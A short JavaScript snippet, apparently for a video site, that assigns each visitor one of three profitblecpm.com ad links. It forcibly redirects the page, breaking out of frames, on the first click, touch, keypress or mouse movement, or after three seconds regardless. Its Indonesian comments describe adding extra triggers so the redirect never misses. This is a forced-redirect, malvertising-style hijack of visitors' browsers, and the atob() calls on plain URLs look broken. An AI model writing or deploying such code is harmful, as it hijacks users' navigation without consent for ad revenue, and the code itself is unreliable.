<script>
(function () {
  // PASTIKAN semua URL https
  const adLinks = {
    1: atob("https://profitblecpm.com/s3ti4od6sekey=cmsf39c9mk11c15e053540af825eabbcf333d8ee4d"),
    2: atob("https://profitblecpm.com/s48gmyq8wkey=e6e132cb86f4e094f9d259e06c7ea212"),
    3: atob("https://profitblecpm.com/v1rbr581xkey=2563cb91afd21d40a46e9a2f072ac865")
  };

  function getBlock() {
    try {
      const saved = localStorage.getItem("vidoy_user_block");
      if (saved) return parseInt(saved, 10);
      const r = Math.floor(Math.random() * 3) + 1;
      localStorage.setItem("vidoy_user_block", String(r));
      return r;
    } catch { return Math.floor(Math.random() * 3) + 1; }
  }

  const block = getBlock();
  const redirectLink = adLinks[block];
  const FLAG = "__vidoy_redirect_done__";

  function go(url) {
    if (!url || window[FLAG]) return;
    window[FLAG] = true;
    try {
      if (top && top !== self) { try { top.location.href = url; return; } catch(e){} }
      location.assign(url);
    } catch { location.href = url; }
  }

  const once = { once: true, capture: true, passive: true };
  const trigger = () => go(redirectLink);

  // lebih banyak pemicu biar nggak “meleset”
  document.addEventListener('click', trigger, once);
  document.addEventListener('touchstart', trigger, once);
  document.addEventListener('keydown', trigger, once);
  document.addEventListener('mousemove', trigger, once);

  // fallback pelan kalau user diem
  setTimeout(trigger, 3000);
})();
</script>
